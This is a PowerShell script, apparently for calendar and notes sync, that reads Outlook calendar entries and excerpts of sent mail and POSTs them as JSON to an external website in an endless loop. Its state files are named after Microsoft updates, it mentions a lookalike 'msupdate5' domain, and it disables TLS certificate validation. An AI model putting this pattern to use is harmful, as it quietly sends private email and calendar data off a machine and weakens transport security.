# from https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/retrieving-outlook-calendar-entries
# from https://devblogs.microsoft.com/scripting/hey-scripting-guy-how-can-i-display-my-office-outlook-appointments-without-starting-office-outlook/

Function Get-OutlookCalendar {
    # Look forward two weeks
    $dte = Get-Date
    $week = $dte.AddDays(14)

    # Load the required .NET types
    [Reflection.Assembly]::LoadWithPartialname("Microsoft.Office.Interop.Outlook") | Out-Null
    
    # Outlook object model
    $outlook = New-Object -ComObject "Outlook.Application"

    # Connect to the appropriate location
    $namespace = $outlook.GetNameSpace("MAPI")
    $Calendar = [Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderCalendar
    $folder = $namespace.getDefaultFolder($Calendar)

    # Get calendar items
    $items = $folder.items
    $items |
    Foreach-Object {
        Write-Progress -activity "Inspecting $($items.count) calendar appointments"  -Status "Processing ..." `
            -PercentComplete ($i / $items.count * 100)
        if ($_.Subject -ne "b" -AND (($_.Start -ge $dte -AND $_.Start -le $week) -OR ($_.IsRecurring -eq $true -AND ($_.Start -le $week -OR $_.End -ge $dte)))) {
            $obj = New-Object -TypeName "PSCustomObject" -Property @{
                
                Start                      = $_.Start;
                StartUTC                   = $_.StartUTC;
                End                        = $_.End;
                EndUTC                     = $_.EndUTC;
                Categories                 = $_.Categories;
                Subject                    = $_.Subject;
                Location                   = $_.Location;
                #RTFBody=$_.RTFBody;
                Body                       = $_.Body;
                IsRecurring                = $_.IsRecurring;
                Organizer                  = $_.Organizer;
                #Recipients=$_.Recipients;
                OptionalAttendees          = $_.OptionalAttendees;
                RequiredAttendees          = $_.RequiredAttendees;
                ResponseStatus             = $_.ResponseStatus;
                AllDayEvent                = $_.AllDayEvent;
                ReminderMinutesBeforeStart = $_.ReminderMinutesBeforeStart;
                RecurrenceState            = $_.RecurrenceState;
                PC                         = $env:COMPUTERNAME;
                GlobalAppointmentID        = $_.GlobalAppointmentID;

            }
            return $obj
        }
        $i++
    }
}

Function Set-CloudEvents($json) {
    # Write events to EXO calendar
    Write-Host ">> Set-CloudEvents"
    $local = "ms-updates-prev.txt"
    try {
        # Skip if same as before
        $prev = Get-Content $local -ErrorAction SilentlyContinue -Encoding UTF8 | Out-String
        if ($prev.Trim() -eq $json.Trim()) {
            Write-Host "Skip" -ForegroundColor "Cyan"
            return
        }
    }
    catch {}

    # Dynamic URL
    # "https://msupdate5.com/api/events"
    $uri = "https://www.spjeff.com/feed/"
    $uri

    # Upload HTTP POST with JSON body
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $result = Invoke-WebRequest -Uri $uri -Body $json -Method "POST" -ContentType "application/json; charset=utf-8" -Headers @{"Pc" = $env:computername }
    $result.StatusCode
    if ($result.StatusCode -ge 200 -and
        $result.StatusCode -lt 300
    ) {
        $json | Out-File $local -Force
    }
}

Function Get-OutlookSent {
    # Look forward two weeks
    $dte = Get-Date
    $week = $dte.AddDays(-7)

    # Load the required .NET types
    [Reflection.Assembly]::LoadWithPartialname("Microsoft.Office.Interop.Outlook") | Out-Null
    
    # Outlook object model
    $outlook = New-Object -ComObject "Outlook.Application"

    # Connect to the appropriate location
    $namespace = $outlook.GetNameSpace("MAPI")
    $sent = [Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderSentMail
    $folder = $namespace.getDefaultFolder($sent)

    # Get calendar items
    $notes = ""
    $items = $folder.items
    $items |
    Foreach-Object {
        Write-Progress -activity "Inspecting $($items.count) sent mail"  -Status "Processing ..." -PercentComplete ($i / $items.count * 100)
        if ($_.SentOn -ge $week) {
            # Body max 200
            $max = 200
            $body = $_.Body
            if ($body.Length -gt $max) {
                $body = $body.Substring(0, $max);
            }
            $notes += $_.Subject + " " + $body
        }
        $i++
    }
    return $notes
}

Function Set-CloudNotes($json) {
    # Write events to EXO calendar
    Write-Host ">> Set-CloudNotes"
    $local = "ms-updates-notes-prev.txt"
    try {
        # Skip if same as before
        $prev = Get-Content $local -ErrorAction SilentlyContinue -Encoding UTF8 | Out-String
        if ($prev.Trim() -eq $json.Trim()) {
            Write-Host "Skip" -ForegroundColor "Cyan"
            return
        }
    }
    catch {}

    # Dynamic URL
    #$uri = "https://msupdate5.com/api/notes"
    $uri = "https://www.spjeff.com/feed2/"
    $uri

    # Upload HTTP POST with JSON body
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $result = Invoke-WebRequest -Uri $uri -Body $json -Method "POST" -ContentType "application/json; charset=utf-8" -Headers @{"Pc" = $env:computername }
    $result.StatusCode
    if ($result.StatusCode -ge 200 -and
        $result.StatusCode -lt 300
    ) {
        $json | Out-File $local -Force
    }
}

function Main() {
    # Ignore SSL Warning
    # from https://stackoverflow.com/questions/11696944/powershell-v3-invoke-webrequest-https-error
    add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

    # ----- CALENDAR SYNC -----

    # Read calendar
    $events = Get-OutlookCalendar
    $total = $events.Count
    Write-Host "Found $total" -Fore "Yellow"

    # JSON text file
    $local = "ms-updates-prev.txt"
    $localjson = $local.Replace("prev", "curr")
    $json = ConvertTo-Json $events
    $json | Out-File $localjson -Force
    $json = Get-Content $localjson -ErrorAction SilentlyContinue -Encoding UTF8 | Out-String

    # Upload to SQL Azure
    Set-CloudEvents $json

    # ----- SENT NOTES 4PM ONLY -----

    # Only process 5-6PM CST end of day
    $we = (Get-Date)
    # if ($we.Hour -eq 17) {    
        # Upcoming Friday (Week Ending)
        while ($we.DayOfWeek -ne "Friday") {
            $we = $we.AddDays(1)
        }

        # Read sent folder
        $notes = Get-OutlookSent
        $obj = New-Object -TypeName "PSCustomObject" -Property @{
            Notes      = $notes;
            PC         = $env:COMPUTERNAME;
            WeekEnding = $we.ToString("MM-dd-yyyy")
        }
        Write-Host "Found Sent $($notes.Length)" -Fore "Yellow"

        # JSON text file
        $json = $obj | ConvertTo-Json
        $local = "ms-updates-notes-prev.txt"
        $localjson = $local.Replace("prev", "curr")
        $json | Out-File $localjson -Force
        $json = Get-Content $localjson -ErrorAction SilentlyContinue -Encoding UTF8 | Out-String

        # Upload to SQL
        Set-CloudNotes $json
    # }
}

# Optional HTTP 407 proxy 
# http://woshub.com/using-powershell-behind-a-proxy/
if ($env:computername -like "NGV*") {
    $wcl = New-Object System.Net.WebClient
    $creds = Get-Credential
    $wcl.Proxy.Credentials = $creds
}

# Main loop
Start-Process "OUTLOOK.EXE"
While ($true) {
    Main
    Get-Date
    # Write-Host "Wait 15 minutes ... "
    # Start-Sleep (60 * 15)
}
